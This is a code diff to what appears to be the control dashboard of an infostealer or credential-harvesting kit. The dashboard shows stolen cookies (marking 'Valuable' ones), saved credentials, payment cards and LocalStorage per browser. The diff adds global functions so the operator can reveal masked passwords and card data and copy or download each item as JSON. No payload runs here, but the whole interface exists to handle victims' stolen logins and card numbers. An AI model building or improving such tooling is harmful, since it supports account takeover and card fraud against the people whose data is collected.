@@ -2027,7 +2027,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — ALL FEATURES + AUTO-DETECT URL
+    DASHBOARD LOGIC — ALL FEATURES + AUTO-DETECT URL + MODAL BUTTONS FIXED
     ============================================================ -->
     <script>
         // ============================================================
@@ -3979,6 +3979,7 @@
                         </span>
                     </div>
 
+                    <!-- COOKIES -->
                     <div class="data-section">
                         <div class="section-title">🍪 Cookies (${cookieEntries.length})</div>
                         ${cookieEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cookies</div>' : ''}
@@ -3990,14 +3991,15 @@
                                     <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
                                     ${isValuable(name) ? '<span class="badge-valuable">Valuable</span>' : ''}
                                     <div class="actions">
-                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'cookie')">⬇️</button>
+                                        <button class="btn-icon-sm copy" onclick="copyTextModal('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItemModal('${name}', '${escaped}', 'cookie')">⬇️</button>
                                     </div>
                                 </div>
                             `;
                         }).join('')}
                     </div>
 
+                    <!-- CREDENTIALS -->
                     <div class="data-section">
                         <div class="section-title">🔐 Credentials (${creds.length})</div>
                         ${creds.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No credentials</div>' : ''}
@@ -4022,15 +4024,16 @@
                                     <span class="badge-type">${type}</span>
                                     <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                     <div class="actions">
-                                        <button class="btn-icon-sm eye" onclick="window.togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
-                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'credential')">⬇️</button>
+                                        <button class="btn-icon-sm eye" onclick="togglePasswordVisModal('${visKey}', '${visKey}-val')">👁️</button>
+                                        <button class="btn-icon-sm copy" onclick="copyTextModal('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItemModal('${name}', '${escaped}', 'credential')">⬇️</button>
                                     </div>
                                 </div>
                             `;
                         }).filter(Boolean).join('')}
                     </div>
 
+                    <!-- CARDS -->
                     <div class="data-section">
                         <div class="section-title">💳 Cards (${cards.length})</div>
                         ${cards.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cards</div>' : ''}
@@ -4058,15 +4061,16 @@
                                     <span class="badge-type">${type}</span>
                                     <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                     <div class="actions">
-                                        <button class="btn-icon-sm eye" onclick="window.togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
-                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'card')">⬇️</button>
+                                        <button class="btn-icon-sm eye" onclick="togglePasswordVisModal('${visKey}', '${visKey}-val')">👁️</button>
+                                        <button class="btn-icon-sm copy" onclick="copyTextModal('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItemModal('${name}', '${escaped}', 'card')">⬇️</button>
                                     </div>
                                 </div>
                             `;
                         }).filter(Boolean).join('')}
                     </div>
 
+                    <!-- LOCALSTORAGE -->
                     <div class="data-section">
                         <div class="section-title">💾 LocalStorage (${storageEntries.length})</div>
                         ${storageEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No LocalStorage</div>' : ''}
@@ -4085,8 +4089,8 @@
                                     <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
                                     <span class="badge-storage">${browserLabel}</span>
                                     <div class="actions">
-                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${cleanKey}', '${escaped}', 'localstorage')">⬇️</button>
+                                        <button class="btn-icon-sm copy" onclick="copyTextModal('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItemModal('${cleanKey}', '${escaped}', 'localstorage')">⬇️</button>
                                     </div>
                                 </div>
                             `;
@@ -4102,6 +4106,58 @@
 
         function closeModal() {
             document.getElementById('modalOverlay').classList.remove('active');
+        }
+
+        // ============================================================
+        // MODAL BUTTON FUNCTIONS — GLOBAL SCOPE
+        // ============================================================
+
+        function copyTextModal(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('✅ Copied!', 'success');
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.left = '-9999px';
+                ta.style.top = '-9999px';
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); showToast('✅ Copied!', 'success'); } catch(e) { showToast('❌ Copy failed', 'error'); }
+                document.body.removeChild(ta);
+            });
+        }
+
+        function downloadItemModal(name, value, type) {
+            const data = { name: name, value: value, type: type, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            const safeName = name.replace(/[^a-zA-Z0-9]/g, '_');
+            a.download = `${type}_${safeName}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 ${type} downloaded`, 'success');
+        }
+
+        function togglePasswordVisModal(key, elementId) {
+            passwordVisibility[key] = !passwordVisibility[key];
+            const el = document.getElementById(elementId);
+            if (el) {
+                if (passwordVisibility[key]) {
+                    el.classList.remove('password-hidden');
+                    el.textContent = el.dataset.originalValue || el.textContent;
+                } else {
+                    el.classList.add('password-hidden');
+                    el.textContent = el.textContent.replace(/[^\s]/g, '•');
+                }
+            }
+            if (el && !el.dataset.originalValue) {
+                el.dataset.originalValue = el.textContent;
+            }
         }
 
         // ============================================================
